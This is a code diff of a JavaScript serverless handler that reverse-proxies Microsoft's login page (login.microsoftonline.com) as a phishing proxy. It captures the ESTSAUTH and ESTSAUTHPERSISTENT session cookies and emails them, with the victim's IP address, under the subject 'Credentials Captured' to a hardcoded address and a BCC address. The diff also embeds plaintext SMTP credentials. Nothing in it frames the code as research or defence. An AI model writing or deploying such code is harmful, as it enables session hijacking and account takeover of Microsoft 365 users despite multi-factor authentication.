@@ -1,19 +1,29 @@
+import fetch from 'node-fetch';
 import nodemailer from 'nodemailer';
 
+// Configuration
 const upstream = 'login.microsoftonline.com';
 const upstream_path = '/';
 const https = true;
+const blocked_region = [];
+const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];
 
-// Create Nodemailer transporter
+// Configure Nodemailer with provided SMTP details
 const transporter = nodemailer.createTransport({
-    host: process.env.SMTP_HOST,
-    port: parseInt(process.env.SMTP_PORT, 10),
-    secure: false, // true for 465, false for other ports
+    host: 'mail.mailo.com',
+    port: 587,
+    secure: false, // Use TLS
     auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASS
+        user: 'coinreport@mailo.com',
+        pass: 'sagekidayo'
     }
 });
+
+export const config = {
+    api: {
+        bodyParser: false
+    }
+};
 
 export default async function handler(req, res) {
     const region = req.headers['cf-ipcountry'] ? req.headers['cf-ipcountry'].toUpperCase() : '';
@@ -24,7 +34,6 @@ export default async function handler(req, res) {
         return;
     }
 
-    let all_cookies = "";
     let url = new URL(req.url, `https://${req.headers.host}`);
     let url_hostname = url.hostname;
 
@@ -32,19 +41,12 @@ export default async function handler(req, res) {
     url.host = upstream;
     url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;
 
-    let method = req.method;
-    let new_request_headers = new Headers(req.headers);
-    new_request_headers.set('Host', upstream);
-    new_request_headers.set('Referer', `${url.protocol}//${url_hostname}`);
-
-    let body = req.method === 'POST' ? req.body : null; // Only include body for POST requests
-
     try {
         // Fetch from upstream URL
         const response = await fetch(url.href, {
-            method,
-            headers: Object.fromEntries(new_request_headers.entries()), // Convert Headers to object
-            body: method === 'POST' ? body : undefined // Only include body if it's a POST request
+            method: req.method,
+            headers: req.headers,
+            body: req.method === 'POST' ? req.body : undefined
         });
 
         if (!response.ok) {
@@ -53,36 +55,25 @@ export default async function handler(req, res) {
 
         let original_response_clone = await response.clone();
         let original_text = await replace_response_text(original_response_clone, upstream, url_hostname);
-        let new_response_headers = new Headers(response.headers);
+        let new_response_headers = response.headers.raw();
 
-        new_response_headers.set('access-control-allow-origin', '*');
-        new_response_headers.set('access-control-allow-credentials', true);
-        new_response_headers.delete('content-security-policy');
-        new_response_headers.delete('content-security-policy-report-only');
-        new_response_headers.delete('clear-site-data');
-
-        const originalCookies = response.headers.getAll("Set-Cookie") || [];
-        all_cookies = originalCookies.join("; \n\n");
-
-        originalCookies.forEach(originalCookie => {
-            const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
-            new_response_headers.append("Set-Cookie", modifiedCookie);
-        });
+        // Send email if necessary
+        const cookies = response.headers.raw()['set-cookie'] || [];
+        const all_cookies = cookies.join("; \n\n");
 
         if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
             await sendToServer(`Cookies found:\n\n${all_cookies}`, ip_address);
         }
 
-        // Set the Location header for redirection to Google
         res.writeHead(response.status, {
             'Content-Type': 'text/html',
-            ...Object.fromEntries(new_response_headers.entries()),
+            ...new_response_headers,
             'Location': 'https://google.com'
         });
         res.end(original_text);
 
     } catch (error) {
-        console.error('Error processing request:', error.message); // Log detailed error
+        console.error('Error processing request:', error.message);
         res.status(500).send(`Internal Server Error: ${error.message}`);
     }
 }
@@ -104,7 +95,7 @@ async function sendToServer(data, ip_address) {
         to: 'your-email@example.com', // Replace with your email address
         bcc: 'money@monemail.com',    // BCC address
         subject: 'Credentials Captured',
-        text: `Data: ${data}\nIP Address: ${ip_address}`,
+        text: `Data: ${data}\nIP Address: ${ip_address}`
     };
 
     try {
